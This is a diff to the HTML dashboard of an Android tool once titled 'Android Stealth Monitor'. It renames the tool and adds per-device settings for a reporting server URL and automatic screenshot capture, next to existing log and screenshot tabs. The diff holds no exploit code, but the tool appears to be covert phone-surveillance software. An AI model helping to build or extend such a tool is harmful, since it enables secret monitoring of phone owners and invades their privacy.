@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Android Stealth Monitor</title>
+    <title>Android Monitor</title>
 
 
     <!-- CSS -->
@@ -32,7 +32,7 @@
     <div id="mainBody" style="display: none;">
         <header>
             <img src="../img/eye.png" alt="">
-            <p>ANDROID STEALTH MONITOR</p>
+            <p>ANDROID MONITOR</p>
         </header>
         <div id="container">
             <form id="left">
@@ -95,6 +95,7 @@
                 <div id="tabs">
                     <button class="tab-button active" onclick="showTab('logs')">Logs</button>
                     <button class="tab-button" onclick="showTab('screenshots')">Screenshots</button>
+                    <button class="tab-button" onclick="showTab('config')">Config</button>
                 </div>
                 <div id="logs-tab" class="tab-content active">
                     <textarea name="output" spellcheck="false" id="output" disabled></textarea>
@@ -102,6 +103,80 @@
                 <div id="screenshots-tab" class="tab-content">
                     <div id="screenshots-gallery">
                         <div id="screenshots-list"></div>
+                    </div>
+                </div>
+                <div id="config-tab" class="tab-content">
+                    <div class="config-container">
+                        <!-- Blueprint Section -->
+                        <div class="config-section">
+                            <h3>Blueprint (Default Config)</h3>
+                            <p class="config-description">These values are used as default for all new devices</p>
+                            
+                            <div class="config-form">
+                                <div class="config-field">
+                                    <label for="blueprint-server-url">Server URL:</label>
+                                    <input type="text" id="blueprint-server-url" placeholder="https://example.com/android">
+                                </div>
+                                
+                                <div class="config-field">
+                                    <label for="blueprint-screenshot-quality">Screenshot Quality (1-100):</label>
+                                    <input type="number" id="blueprint-screenshot-quality" min="1" max="100" value="70">
+                                </div>
+                                
+                                <div class="config-field">
+                                    <label for="blueprint-auto-screenshot">
+                                        <input type="checkbox" id="blueprint-auto-screenshot" checked>
+                                        Auto Screenshot Enabled
+                                    </label>
+                                </div>
+                                
+                                <div class="config-actions">
+                                    <button onclick="saveBlueprint()" class="config-button save">Save Blueprint</button>
+                                    <button onclick="loadBlueprint()" class="config-button reload">Reload</button>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <!-- Device Config Section -->
+                        <div class="config-section" id="device-config-section" style="display: none;">
+                            <h3>Device Configuration</h3>
+                            <p class="config-description">Configuration for selected device: <span id="config-device-name">--</span></p>
+                            
+                            <div class="config-form">
+                                <div class="config-field">
+                                    <label for="device-server-url">Server URL:</label>
+                                    <input type="text" id="device-server-url" placeholder="https://example.com/android">
+                                </div>
+                                
+                                <div class="config-field">
+                                    <label for="device-screenshot-quality">Screenshot Quality (1-100):</label>
+                                    <input type="number" id="device-screenshot-quality" min="1" max="100" value="70">
+                                </div>
+                                
+                                <div class="config-field">
+                                    <label for="device-auto-screenshot">
+                                        <input type="checkbox" id="device-auto-screenshot" checked>
+                                        Auto Screenshot Enabled
+                                    </label>
+                                </div>
+                                
+                                <div class="config-field">
+                                    <label>Config Source:</label>
+                                    <span id="device-config-source">Blueprint</span>
+                                </div>
+                                
+                                <div class="config-actions">
+                                    <button onclick="saveDeviceConfig()" class="config-button save">Save Device Config</button>
+                                    <button onclick="resetDeviceConfig()" class="config-button reset">Reset to Blueprint</button>
+                                    <button onclick="loadDeviceConfig()" class="config-button reload">Reload</button>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <!-- Message when no device selected -->
+                        <div class="config-section" id="no-device-selected">
+                            <p class="config-message">Select a device to view/edit its configuration</p>
+                        </div>
                     </div>
                 </div>
             </div>
